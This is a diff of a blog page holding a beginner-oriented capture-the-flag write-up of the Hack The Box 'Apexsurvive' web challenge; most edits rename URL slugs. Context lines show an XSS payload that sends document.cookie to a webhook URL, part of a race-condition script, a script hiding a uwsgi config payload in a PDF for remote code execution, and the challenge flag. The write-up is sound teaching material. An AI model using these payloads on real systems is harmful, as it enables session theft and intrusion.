@@ -6,11 +6,12 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Chapter 0: Introduction Hey there👋. I am Adham Elmosalamy, a Computer Engineering student, and in this post I will walk you through my solution of Apexsurvive from Hack The Box 2024 Cyber Apocalypse CTF, a beautiful challenge that costed me three days of research, experimentation and sweat to take down.
-This is a beginner-friendly writeup where I explain how web challenges like this could be approached: going over methodology, mindset and research." />
+<meta name="description" content="Chapter 0: Introduction Hey there👋. I am Adham Elmosalamy, a Computer Engineering student, and in this post I will walk you through my solution of Apexsurvive, a beautiful challenge that costed me three days of research, experimentation and sweat to take down.
+This is a beginner-friendly writeup where I explain how web challenges like this could be approached: going over methodology, mindset and research.
+If you just want the solution, here is the final attack chain." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
-<link rel="canonical" href="//localhost:1313/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/" />
+<link rel="canonical" href="//localhost:1313/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/" />
 
 
 
@@ -37,9 +38,10 @@ This is a beginner-friendly writeup where I explain how web challenges like this
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Apexsurvive Writeup (HTB Cyber Apocalypse 2024)">
-<meta property="og:description" content="Chapter 0: Introduction Hey there👋. I am Adham Elmosalamy, a Computer Engineering student, and in this post I will walk you through my solution of Apexsurvive from Hack The Box 2024 Cyber Apocalypse CTF, a beautiful challenge that costed me three days of research, experimentation and sweat to take down.
-This is a beginner-friendly writeup where I explain how web challenges like this could be approached: going over methodology, mindset and research." />
-<meta property="og:url" content="//localhost:1313/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/" />
+<meta property="og:description" content="Chapter 0: Introduction Hey there👋. I am Adham Elmosalamy, a Computer Engineering student, and in this post I will walk you through my solution of Apexsurvive, a beautiful challenge that costed me three days of research, experimentation and sweat to take down.
+This is a beginner-friendly writeup where I explain how web challenges like this could be approached: going over methodology, mindset and research.
+If you just want the solution, here is the final attack chain." />
+<meta property="og:url" content="//localhost:1313/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/" />
 <meta property="og:site_name" content="elmosalamy | blog" />
 
   <meta property="og:image" content="//localhost:1313/">
@@ -141,7 +143,7 @@ This is a beginner-friendly writeup where I explain how web challenges like this
     
 <div class="post">
   <h1 class="post-title">
-    <a href="//localhost:1313/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/">Apexsurvive Writeup (HTB Cyber Apocalypse 2024)</a></h1>
+    <a href="//localhost:1313/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/">Apexsurvive Writeup (HTB Cyber Apocalypse 2024)</a></h1>
   <div class="post-meta">
     
       <span class="post-date">
@@ -215,9 +217,9 @@ This is a beginner-friendly writeup where I explain how web challenges like this
 
   <div class="post-content"><div>
         <h2 id="chapter-0-introduction">Chapter 0: Introduction<a href="#chapter-0-introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>Hey there👋. I am <strong>Adham Elmosalamy</strong>, a Computer Engineering student, and in this post I will walk you through my solution of <strong>Apexsurvive</strong> from Hack The Box 2024 Cyber Apocalypse CTF, a beautiful challenge that costed me three days of research, experimentation and sweat to take down.</p>
+<p>Hey there👋. I am <strong>Adham Elmosalamy</strong>, a Computer Engineering student, and in this post I will walk you through my solution of <strong>Apexsurvive</strong>, a beautiful challenge that costed me three days of research, experimentation and sweat to take down.</p>
 <p>This is a beginner-friendly writeup where I explain how web challenges like this could be approached: going over methodology, mindset and research.</p>
-<p><em>If you just want the solution, here is <a href="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/#chapter-6-the-attack-chain">the final attack chain.</a></em></p>
+<p><em>If you just want the solution, here is <a href="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/#chapter-6-the-attack-chain">the final attack chain.</a></em></p>
 <table>
 <thead>
 <tr>
@@ -242,7 +244,7 @@ This is a beginner-friendly writeup where I explain how web challenges like this
 <p>We are given a running instance of the challenge + the source code, making this a white-box test.</p>
 <h2 id="chapter-1-a-very-normal-user">Chapter 1: A Very Normal User<a href="#chapter-1-a-very-normal-user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Let&rsquo;s explore the site&rsquo;s functionality starting with the homepage.</p>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/guideline.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/guideline.png"></p>
 <p>We are given a bunch of guidelines and we are told that there are three routes in this app:</p>
 <ul>
 <li><code>/challenge/</code></li>
@@ -250,30 +252,30 @@ This is a beginner-friendly writeup where I explain how web challenges like this
 <li><code>/email/</code> (Out of scope)</li>
 </ul>
 <p>Navigating to <strong>Email App</strong> we are taken to <code>/email/</code>, an empty inbox, probably for our assigned email address <code>test@email.htb</code> as per the guidelines.</p>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-empty.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/inbox-empty.png"></p>
 <p>Cool. Let&rsquo;s go back and check <strong>Challenge</strong> which takes us to <code>/challenge/</code> and presents us with a simple login screen.</p>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/login-empty.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/login-empty.png"></p>
 <p>We register an account using <code>test@email.htb</code> and login.</p>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/user-registered.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/user-registered.png"></p>
 <p>Once logged in, we are taken to <code>/challenge/settings</code>, a form where we can modify our account settings.</p>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/account-settings.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/account-settings.png"></p>
 <p>Hovering over the navigation, there seems to be one valid link: <strong>Home</strong> (<code>/challenge/home</code>). We also notice an interesting <strong>Report Item</strong> feature.</p>
 <p>Both features return <code>Please verify your email first!</code>, so we do just that. We click <strong>Verify Email</strong>, check our inbox and follow the instructions to verify our account.</p>
 <ol>
 <li>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/verification-sent.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/verification-sent.png"></p>
 </li>
 <li>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-verification.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/inbox-verification.png"></p>
 </li>
 <li>
 <p>We receive <code>Email verified!</code></p>
 </li>
 </ol>
 <p>Now we can access <code>/challenge/home</code> which shows us a list of items, seemingly for sale.</p>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/home.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/home.png"></p>
 <p>And we can report an item. The confirmation messages alludes to a potential XSS vulnerability, let&rsquo;s keep that in mind.</p>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/report-item.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/report-item.png"></p>
 <p>Excellent! We have completed the very first step of any web pentest: forming a conception of the purpose of the app, its features and user flow.</p>
 <h2 id="chapter-2-navigating-the-tech-stack">Chapter 2: Navigating the Tech Stack<a href="#chapter-2-navigating-the-tech-stack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>After scoping user flow and functionality, it is time to dig into the internals of the application.</p>
@@ -783,10 +785,10 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <p>We are left with the username sink, and thankfully we are authorized to modify our profile settings. Additionally, the <code>bleach</code> whitelist allows us to use an <code>id</code> attribute within an <code>a</code> tag!</p>
 <ol>
 <li>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/sw-hijacking-1.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/sw-hijacking-1.png"></p>
 </li>
 <li>
-<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/sw-hijacking-2.png"></p>
+<p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/sw-hijacking-2.png"></p>
 </li>
 </ol>
 <p>Our hypothesis was correct. We were able to control the <code>host</code> parameter and hijack the load path from the default <code>https://storage.googleapis.com</code> to our own non-existing <code>HIJACKEDSCRIPT</code> host.</p>
@@ -804,7 +806,7 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <p>Here is a good example of that: we can try to exploit the <code>{{ product.note | safe }}</code> XSS DOM sink, discovered in the previous attempt, even though we have not found a way to make it reachable yet.</p>
 <p>A quick, local proof-of-concept:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;1&#34;</span>)}<span style="color:#e6db74">` //
-</span></span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-proof.png"></p>
+</span></span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/xss-proof.png"></p>
 <p>Since the cookie had <code>HttpOnly: false</code>, we could theoretically exfiltrate the cookie of anyone who visits the product page with a similar payload:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://webhook.site/REDACTED/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>))}<span style="color:#e6db74">` //
 </span></span></span></code></pre></div><p>We will keep this in our pocket, maybe we will need it.</p>
@@ -884,7 +886,7 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </ol>
 <p>That&rsquo;s our theorized attack path; however, we are unable to kick start it because it requires the <code>isInternal</code> privilege to perform step 1.</p>
 <p>Let&rsquo;s visualize our attack chain so far:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-incomplete.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/attack-chain-incomplete.png"></p>
 <p>This nicely illustrates what we discussed earlier about white-box testing where we might find an entire attack chain, while the chain&rsquo;s entry point is yet inaccessible to us.</p>
 <p>Let&rsquo;s focus on gaining the <code>isInternal</code> privilege since everything seems to depend on it. How do we get <code>isInternal</code>?</p>
 <p>A <code>Ctrl+Shift+F</code> (underrated tool) in the codebase for <code>isInternal</code> shows us the <em>only</em> function in the app that sets <code>isInternal</code> to <code>true</code>:</p>
@@ -1087,7 +1089,7 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </ul>
 <p>I devoured that entire article, it is very concise, on-point and a total masterpiece. Not only was it extremely relevant for our app, it also provided a framework for discovering, reasoning about and approaching race conditions and any time-sensitive vulnerability in general.</p>
 <p>A very important section explained Kettle&rsquo;s race condition finding in Devise, a popular authentication framework in the Ruby ecosystem:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/devise-rc.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/devise-rc.png"></p>
 <p>The similarity is so stark, down to variable names, and I cannot help but think the challenge author must have taken some inspiration from this exact article.</p>
 <p>At this point, we have successfully persevered through uncertainty. We are no longer flailing at the dark, we know what we are dealing with and it looks more promising than ever.</p>
 <p>Let&rsquo;s try a little proof-of-concept by locally patching <code>sendVerification</code> to include a 5 second delay as so:</p>
@@ -1140,7 +1142,7 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <p>I later found that this feature is available in good ol&rsquo; <strong>Repeater</strong> where you could group multiple requests before sending them in parallel. - me</p>
 </blockquote>
 <p>So, let&rsquo;s send a request over to Turbo Intruder:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/turbo-intruder-send.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/turbo-intruder-send.png"></p>
 <p>With a bit of experimentation, I wrote a script based off Turbo Intruder&rsquo;s <code>race-multi-endpoint</code> preset:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">queueRequests</span>(target, wordlists):
 </span></span><span style="display:flex;"><span>
@@ -1195,32 +1197,32 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handleResponse</span>(req, interesting):
 </span></span><span style="display:flex;"><span>    table<span style="color:#f92672">.</span>add(req)
-</span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/turbo-intruder-config.png"></p>
+</span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/turbo-intruder-config.png"></p>
 <p>Let&rsquo;s launch the attack and see what we get:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-apexsurvive-multi.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/inbox-apexsurvive-multi.png"></p>
 <p>Out of 10 race condition attempts, we had 3 successful hits where a token intended for <code>attacker@apexsurvive.htb</code> made it to our inbox. The race condition is exploitable after all!</p>
 <p>Now, these verification tokens are not usable because they got superseded by failed attempts, this means we must stop on success to preserve elevated tokens.</p>
 <p>This is doable manually since hit chance is pretty high, but I don&rsquo;t think it would be hard to automate it either.</p>
 <p>Anyways, we are now certain that we can win the race. We did it.</p>
 <h2 id="chapter-6-the-attack-chain">Chapter 6: The Attack Chain<a href="#chapter-6-the-attack-chain" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>With the race condition completed, let&rsquo;s look at our new attack chain:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-admin.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/attack-chain-admin.png"></p>
 <p>We should be able to reach admin easily now.</p>
 <p>Starting with a normal user, we run our race condition payload manually, one-by-one until we get a hit:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-apexsurvive-single.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/inbox-apexsurvive-single.png"></p>
 <p>We then verify our email to unlock the <strong>Internal Settings</strong>
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/internal-settings.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/internal-settings.png"></p>
 <p>We then enter a poisoned product into the system:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-product-add.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/xss-product-add.png"></p>
 <p>&hellip; and submit it for review by the admin bot:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-product-reported.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/xss-product-reported.png"></p>
 <p>A few seconds pass, then we receive the exfiltrated admin cookie:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/webhook-admin-cookie.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/webhook-admin-cookie.png"></p>
 <p>We hijack the admin session and unlock <strong>Admin Settings</strong>
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/admin-contract.png">
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/admin-contract.png">
 Also notice our new, admin username: <code>Xclow3n</code>.</p>
 <p>We are now admin. The next goal is RCE, but how?
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-admin.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/attack-chain-admin.png"></p>
 <p>With our newly-acquired privileges, let&rsquo;s reevaluate our new building blocks. Remember our methodology pep-talk earlier?</p>
 <p>We have one new endpoint exclusively available to admin users: <code>/addContract</code></p>
 <p>Let&rsquo;s give it some scrutiny:</p>
@@ -1286,7 +1288,7 @@ Also notice our new, admin username: <code>Xclow3n</code>.</p>
 <p>The same article suggests embedding the weaponized <code>uwsgi</code> configuration within a JPEG as metadata, packaging that in a PDF, then the final PDF would be your payload.</p>
 <p>They kindly provided a proof-of-concept as well. Let&rsquo;s get to work</p>
 <p>We set up our listeners, I usually use <code>ngrok</code> to obtain a publicly accessible TCP endpoint:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/listener-setup.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/listener-setup.png"></p>
 <p>Let&rsquo;s weaponize an innocent <code>flower.jpg</code>, notice how the payload pads the JPEG metadata with newlines (these are the <code>&amp;#x0a;</code> sequences on either side):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> fpdf <span style="color:#f92672">import</span> FPDF
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> exiftool <span style="color:#f92672">import</span> ExifToolHelper
@@ -1306,18 +1308,18 @@ Also notice our new, admin username: <code>Xclow3n</code>.</p>
 </span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>add_page()
 </span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>image(<span style="color:#e6db74">&#39;./flower.jpg&#39;</span>)
 </span></span><span style="display:flex;"><span>pdf<span style="color:#f92672">.</span>output(<span style="color:#e6db74">&#39;payload.pdf&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>)
-</span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/gen-pdf.png"></p>
+</span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/gen-pdf.png"></p>
 <p>Finally, this is our payload, can&rsquo;t be malicious, right?
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/pdf-payload.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/pdf-payload.png"></p>
 <p>We upload the request through Repeater, setting the filename to <code>/app/uwsgi.ini</code> to overwrite <code>uwsgi</code>&rsquo;s current config file:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/repeater-pdf-rce.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/repeater-pdf-rce.png"></p>
 <p>Notice how the image metadata (with our <code>uwsgi</code> command) are stored as plaintext within the otherwise encoded PDF; that&rsquo;s because we embedded them inside a JPEG which mainly serves to protect our payload from PDF&rsquo;s compression and encoding features as far as I understand.</p>
 <p>To trigger the command, we must reload <code>uwsgi</code> by modifying a python source file within the application, this is a debug feature enabled in the currently loaded <code>uwsgi.ini</code> through:</p>
 <pre tabindex="0"><code>py-autoreload = 3
 </code></pre><p>For that, we will just overwrite any file say <code>/app/application/database.py</code>. We send our request and&hellip;
-<img src="posts/Apexsurvive%20Writeup%20(HTB%20Cyber%20Apocalypse%202024)/flag.png"></p>
+<img src="posts/Apexsurvive%20Writeup%20(Hack%20The%20Box%20Cyber%20Apocalypse%202024)/flag.png"></p>
 <p><code>HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}</code>
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-complete.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/attack-chain-complete.png"></p>
 <h2 id="chapter-7-conclusion">Chapter 7: Conclusion<a href="#chapter-7-conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>This challenge became an instant favorite. It is the most challenging and, by extension, rewarding, web challenge I&rsquo;ve ever solved.</p>
 <p>Indeed, the steps seem pretty straightforward now, but the &ldquo;uncertainty management&rdquo; aspect we discussed is what makes security research a time consuming exercise. You don&rsquo;t know what you are expecting until you find it, and you need lots of grit and confidence to get there.</p>
@@ -1326,7 +1328,7 @@ Also notice our new, admin username: <code>Xclow3n</code>.</p>
 <p>At some point, and through a game of elimination, I reached a strong conviction that the only route has to be through <code>isInternal</code>.</p>
 <p>Next, and through another long-winded game of elimination, I reached a conviction that the only way to get <code>isInternal</code> is through a race condition. I got fixated on the race condition, then I pulled it off.</p>
 <p>Visual proof of my somewhat late-night conviction as I explained the situation to my team 😅:
-<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/discord.png"></p>
+<img src="/posts/apexsurvive-writeup-hack-the-box-cyber-apocalypse-2024/discord.png"></p>
 <p>On a second note, there was so much tangential research that I have not included in this writeup, but that does not mean it was useless. The most rewarding aspect of CTFs are these little, educational journeys you take doing seemingly irrelevant, tangential research.</p>
 <p>CTF after CTF and challenge after challenge, you realize you have accumulated a good variety of information, about seemingly random things, and evidently, that variety is what creates a resourceful, solid cybersecurity engineer.</p>
 <p>Big thanks to my team <strong>PwnSec</strong> for their support, it was beautiful to see the team effort as we collaborated on different categories.</p>
